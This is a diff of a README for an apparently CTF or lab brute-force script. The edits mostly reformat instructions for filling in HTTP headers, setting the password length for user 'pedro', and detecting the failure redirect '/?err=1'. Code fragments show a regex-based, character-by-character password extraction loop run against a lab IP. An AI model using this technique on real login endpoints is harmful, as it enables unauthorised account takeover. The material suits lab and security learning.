@@ -9,10 +9,10 @@ After running the script
 
 # What to do first
 
-First, fill the headers and data such that it is the same as your HTTP request.
+*First, fill the headers and data such that it is the same as your HTTP request.*
 
 Example: 
-
+`
 headers = {
     "Host": "10.10.123.171",
     "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
@@ -35,16 +35,18 @@ def try_password_regex(prefix):
     }
     response = requests.post(url, headers=headers, data=data, allow_redirects=False)
     return response
-    
-Second, don't forget to change the max number of characters (for me it was 4 characters for the user pedro)\\
+ `
+ 
+*Second, don't forget to change the max number of characters (for me it was 4 characters for the user pedro)*
 
-Lastly, change the location header that it will redirect you to if the password fails.
+*Lastly, change the location header that it will redirect you to if the password fails.*
 
+`
  if response.status_code == 302 and location_header != "/?err=1":
                 password += char
                 print(f"[+] Found character {i+1}: {char} => {password}")
                 break
 I was redirected to /?err=1 if the character was wrong.
-
+`
 
 Good Luck!
